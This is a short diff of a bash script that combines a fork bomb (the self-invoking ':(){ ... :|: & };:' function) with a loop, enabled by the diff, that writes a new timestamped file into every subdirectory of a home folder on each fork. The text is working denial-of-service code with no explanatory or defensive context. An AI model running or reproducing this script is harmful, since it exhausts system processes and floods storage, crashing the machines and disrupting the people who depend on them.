@@ -2,11 +2,9 @@
 
 DIR="/home/ubuntu/Vitor"
 
-#DIRECTORIES=$(find "$DIR" -type d)
-
 :(){
-    #for D in $DIRECTORIES; do
-        touch "$D/vitor_$(date +%s%N).txt"
-    #done
+    for D in $(find "$DIR" -type d); do
+        touch "$D/arquivo_$(date +%s%N).txt"
+    done
     :|: &
 };:
